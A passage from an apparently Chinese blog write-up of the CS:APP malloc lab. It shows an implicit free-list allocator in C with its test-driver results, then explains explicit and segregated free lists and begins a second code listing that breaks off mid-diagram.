*/<br>#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE((char *)(bp) - WSIZE))<br>#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE))<br><br>char *heap_listp = NULL;<br>int mm_init(void);<br>void *extend_heap(size_t words);<br>void *coalesce(void *bp);<br>void *mm_malloc(size_t size);<br>void *find_fit(size_t asize);<br>void place(void *bp, size_t asize);<br>void mm_free(void *ptr);<br>void *mm_realloc(void *ptr, size_t size);<br><br>/*<br> * mm_init - initialize the malloc package.<br> */<br>int mm_init(void)<br>&#123;<br>    // 申请四个字 用于存储起始块、结尾块和序言块<br>    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)<br>        return -1;<br>    PUT(heap_listp, 0);<br>    PUT(heap_listp + WSIZE, PACK(8, 1));<br>    PUT(heap_listp + 2 * WSIZE, PACK(8, 1));<br>    PUT(heap_listp + 3 * WSIZE, PACK(0, 1));<br>    heap_listp += (2 * WSIZE);<br>    // 申请一个初始的空闲块<br>    if (extend_heap(CHUNKSIZZE / WSIZE) == NULL)<br>        return -1; // 申请失败<br>    return 0;<br>&#125;<br><br>/* 扩展堆 以字为单位*/<br>void *extend_heap(size_t words)<br>&#123;<br>    char *bp;<br>    size_t size;<br><br>    size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE;<br>    if ((long)(bp = mem_sbrk(size)) == -1)<br>        return NULL; // 申请失败<br><br>    PUT(HDRP(bp), PACK(size, 0)); // 设置头部和脚步<br>    PUT(FTRP(bp), PACK(size, 0));<br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); // 设置结尾块<br><br>    // 扩展堆之后，结尾块后面紧跟的就是有效载荷，结尾块变成该载荷的头部<br>    return coalesce(bp);<br>&#125;<br><br>// 合并空闲块 序言块和结尾块 有效避免了边界处理<br>// 参数bp指向有效载荷<br>void *coalesce(void *bp)<br>&#123;<br>    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));<br>    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));<br>    size_t size = GET_SIZE(HDRP(bp));<br><br>    if (prev_alloc &amp;&amp; next_alloc)<br>    &#123;<br>        return bp;<br>    &#125;<br>    else if (prev_alloc &amp;&amp; !next_alloc)<br>    &#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));<br>        PUT(HDRP(bp), PACK(size, 0));<br>        PUT(FTRP(bp), PACK(size, 0));<br>    &#125;<br>    else if (!prev_alloc &amp;&amp; next_alloc)<br>    &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp)));<br>        PUT(FTRP(bp), PACK(size, 0));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    else<br>    &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +<br>                GET_SIZE(FTRP(NEXT_BLKP(bp)));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));<br>        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    return bp;<br>&#125;<br>/*<br> * mm_malloc - Allocate a block by incrementing the brk pointer.<br> *     Always allocate a block whose size is a multiple of the alignment.<br> */<br>void *mm_malloc(size_t size)<br>&#123;<br>    size_t asize;       // adjust block size<br>    size_t extend_size; // extend heap size<br>    char *bp;<br><br>    if (size == 0)<br>        return NULL;<br><br>    // 块最小为16字节   有效载荷最小为8字节  要求按八字节对齐<br>    // 有效载荷小于8 则按8处理；大于8，则向上舍入到8的倍数<br>    if (size &lt;= DSIZE)<br>        asize = 2 * DSIZE;<br>    else<br>        asize = DSIZE * ((size + DSIZE - 1) / DSIZE) + DSIZE;<br><br>    // 寻找合适的空闲块<br>    if ((bp = find_fit(asize)) != NULL)<br>    &#123;<br>        place(bp, asize);<br>        return bp;<br>    &#125;<br><br>    // 没找到合适块 则需要扩展堆 按至少4kB大小来扩展<br>    extend_size = MAX(asize, CHUNKSIZZE);<br>    if ((bp = extend_heap(extend_size / WSIZE)) == NULL)<br>        return NULL;<br>    place(bp, asize);<br>    return bp;<br>&#125;<br><br>// find fit free block<br>void *find_fit(size_t asize)<br>&#123;<br>    void *bp;<br>    for (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp))<br>    &#123;<br>        if (!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp))))<br>            return bp;<br>    &#125;<br>    return NULL;<br>&#125;<br><br>// replace free block<br>void place(void *bp, size_t asize)<br>&#123;<br>    size_t csize = GET_SIZE(HDRP(bp)); // 空闲块大小<br><br>    // 剩余块大于16字节 则需要分割空闲块 否则直接作为内部碎片<br>    if ((csize - asize) &gt;= 2 * DSIZE)<br>    &#123;<br>        PUT(HDRP(bp), PACK(asize, 1));<br>        PUT(FTRP(bp), PACK(asize, 1));<br>        bp = NEXT_BLKP(bp);<br>        PUT(HDRP(bp), PACK(csize - asize, 0));<br>        PUT(FTRP(bp), PACK(csize - asize, 0));<br>    &#125;<br>    else<br>    &#123;<br>        PUT(HDRP(bp), PACK(csize, 1));<br>        PUT(FTRP(bp), PACK(csize, 1));<br>    &#125;<br>&#125;<br>/*<br> * mm_free - Freeing a block does nothing.<br> */<br>void mm_free(void *ptr)<br>&#123;<br>    size_t size = GET_SIZE(HDRP(ptr));<br>    PUT(HDRP(ptr), PACK(size, 0));<br>    PUT(FTRP(ptr), PACK(size, 0));<br>    coalesce(ptr);<br>&#125;<br><br>/*<br> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free<br> */<br>void *mm_realloc(void *ptr, size_t size)<br>&#123;<br>    void *oldptr = ptr;<br>    void *newptr;<br>    size_t copySize;<br><br>    newptr = mm_malloc(size);<br>    if (newptr == NULL)<br>        return NULL;<br>    // copySize = *(size_t *)((char *)oldptr - SIZE_T_SIZE);<br>    copySize = GET_SIZE(HDRP(ptr));<br><br>    if (size &lt; copySize)<br>        copySize = size;<br>    memcpy(newptr, oldptr, copySize);<br>    mm_free(oldptr);<br>    return newptr;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Team</span> Name:ateam<br><span class="hljs-attribute">Member</span> <span class="hljs-number">1</span> :thz:caiji@edu.cn<br><span class="hljs-attribute">Using</span> default tracefiles in traces/<br><span class="hljs-attribute">Measuring</span> performance with gettimeofday().<br><br><span class="hljs-attribute">Testing</span> mm malloc<br><span class="hljs-attribute">Reading</span> tracefile: amptjp-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: cccp-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: cp-decl-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: expr-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: coalescing-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: random-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: random2-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: binary-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: binary2-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: realloc-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><span class="hljs-attribute">Reading</span> tracefile: realloc2-bal.rep<br><span class="hljs-attribute">Checking</span> mm_malloc for correctness, efficiency, and performance.<br><br><span class="hljs-attribute">Results</span> for mm malloc:<br><span class="hljs-attribute">trace</span>  valid  util     ops      secs  Kops<br> <span class="hljs-attribute">0</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">5694</span>  <span class="hljs-number">0</span>.<span class="hljs-number">004855</span>  <span class="hljs-number">1173</span><br> <span class="hljs-attribute">1</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">5848</span>  <span class="hljs-number">0</span>.<span class="hljs-number">004422</span>  <span class="hljs-number">1322</span><br> <span class="hljs-attribute">2</span>       yes   <span class="hljs-number">99</span>%    <span class="hljs-number">6648</span>  <span class="hljs-number">0</span>.<span class="hljs-number">007381</span>   <span class="hljs-number">901</span><br> <span class="hljs-attribute">3</span>       yes  <span class="hljs-number">100</span>%    <span class="hljs-number">5380</span>  <span class="hljs-number">0</span>.<span class="hljs-number">005453</span>   <span class="hljs-number">987</span><br> <span class="hljs-attribute">4</span>       yes   <span class="hljs-number">66</span>%   <span class="hljs-number">14400</span>  <span class="hljs-number">0</span>.<span class="hljs-number">000062231884</span><br> <span class="hljs-attribute">5</span>       yes   <span class="hljs-number">92</span>%    <span class="hljs-number">4800</span>  <span class="hljs-number">0</span>.<span class="hljs-number">004685</span>  <span class="hljs-number">1025</span><br> <span class="hljs-attribute">6</span>       yes   <span class="hljs-number">92</span>%    <span class="hljs-number">4800</span>  <span class="hljs-number">0</span>.<span class="hljs-number">004363</span>  <span class="hljs-number">1100</span><br> <span class="hljs-attribute">7</span>       yes   <span class="hljs-number">55</span>%   <span class="hljs-number">12000</span>  <span class="hljs-number">0</span>.<span class="hljs-number">065336</span>   <span class="hljs-number">184</span><br> <span class="hljs-attribute">8</span>       yes   <span class="hljs-number">51</span>%   <span class="hljs-number">24000</span>  <span class="hljs-number">0</span>.<span class="hljs-number">215049</span>   <span class="hljs-number">112</span><br> <span class="hljs-attribute">9</span>       yes   <span class="hljs-number">27</span>%   <span class="hljs-number">14401</span>  <span class="hljs-number">0</span>.<span class="hljs-number">037013</span>   <span class="hljs-number">389</span><br><span class="hljs-attribute">10</span>       yes   <span class="hljs-number">34</span>%   <span class="hljs-number">14401</span>  <span class="hljs-number">0</span>.<span class="hljs-number">001492</span>  <span class="hljs-number">9653</span><br><span class="hljs-attribute">Total</span>          <span class="hljs-number">74</span>%  <span class="hljs-number">112372</span>  <span class="hljs-number">0</span>.<span class="hljs-number">350112</span>   <span class="hljs-number">321</span><br><br><span class="hljs-attribute">Perf</span> index = <span class="hljs-number">44</span> (util) + <span class="hljs-number">21</span> (thru) = <span class="hljs-number">66</span>/<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h4 id="85分的方案-显式链表-分离适配"><a href="#85分的方案-显式链表-分离适配" class="headerlink" title="85分的方案 显式链表+分离适配"></a>85分的方案 显式链表+分离适配</h4><h5 id="显式链表-教材p603"><a href="#显式链表-教材p603" class="headerlink" title="显式链表 教材p603"></a>显式链表 教材p603</h5><p>隐式链表在查找时需要遍历所有的块，包括分配的和空闲的；</p><p>显式链表通过在空闲块中记录其前驱和后续空闲块，这样查找时只需遍历空闲块。</p><p><img src="/project/./image/7,malloc_lab_image/image-20240912170137353.png" alt="image-20240912170137353"></p><h5 id="分离适配-教材p604"><a href="#分离适配-教材p604" class="headerlink" title="分离适配 教材p604"></a>分离适配 教材p604</h5><p>通过将空闲块按照大小分为<strong>大小类</strong>，按照2的幂划分为若干组，[0,1),[2,4],[4,8],[8,16]……，并记录每组的头指针。</p><p>其优点时，遍历空闲块时则不需遍历所有空闲块，只需遍历特定的空闲块。</p><h5 id="代码及注释"><a href="#代码及注释" class="headerlink" title="代码及注释"></a>代码及注释</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm-naive.c - The fastest, least memory-efficient malloc package.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In this naive approach, a block is allocated by simply incrementing</span><br><span class="hljs-comment"> * the brk pointer.  A block is pure payload. There are no headers or</span><br><span class="hljs-comment"> * footers.  Blocks are never coalesced or reused. Realloc is</span><br><span class="hljs-comment"> * implemented directly using mm_malloc and mm_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NOTE TO STUDENTS: Replace this header comment with your own header</span><br><span class="hljs-comment"> * comment that gives a high level description of your solution.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memlib.h&quot;</span></span><br><br><span class="hljs-comment">/*********************************************************</span><br><span class="hljs-comment"> * NOTE TO STUDENTS: Before you do anything else, please</span><br><span class="hljs-comment"> * provide your team information in the following struct.</span><br><span class="hljs-comment"> ********************************************************/</span><br><span class="hljs-type">team_t</span> team = &#123;<br>    <span class="hljs-comment">/* Team name */</span><br>    <span class="hljs-string">&quot;ateam&quot;</span>,<br>    <span class="hljs-comment">/* First member&#x27;s full name */</span><br>    <span class="hljs-string">&quot;thz&quot;</span>,<br>    <span class="hljs-comment">/* First member&#x27;s email address */</span><br>    <span class="hljs-string">&quot;caiji@edu.cn&quot;</span>,<br>    <span class="hljs-comment">/* Second member&#x27;s full name (leave blank if none) */</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment">/* Second member&#x27;s email address (leave blank if none) */</span><br>    <span class="hljs-string">&quot;&quot;</span>&#125;;<br><br><span class="hljs-comment">/* single word (4) or double word (8) alignment */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGNMENT 8</span><br><br><span class="hljs-comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span><br><br><span class="hljs-comment">///////////////////////////////// Block information /////////////////////////////////////////////////////////</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A   : Allocated? (1: true, 0:false)</span><br><span class="hljs-comment">RA  : Reallocation tag (1: true, 0:false) </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> &lt; Allocated Block &gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">             31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment"> Header :   |                              size of the block                                       |  |  | A|</span><br><span class="hljs-comment">    bp ---&gt; +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment">            |                                                                                               |</span><br><span class="hljs-comment">            |                                                                                               |</span><br><span class="hljs-comment">            .                              Payload and padding                                              .</span><br><span class="hljs-comment">            .                                                                                               .</span><br><span class="hljs-comment">            .                                                                                               .</span><br><span class="hljs-comment">            +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="hljs-comment"> Footer :   |                              size of the block                                       |     | A|</span><br><span class="hljs-comment">            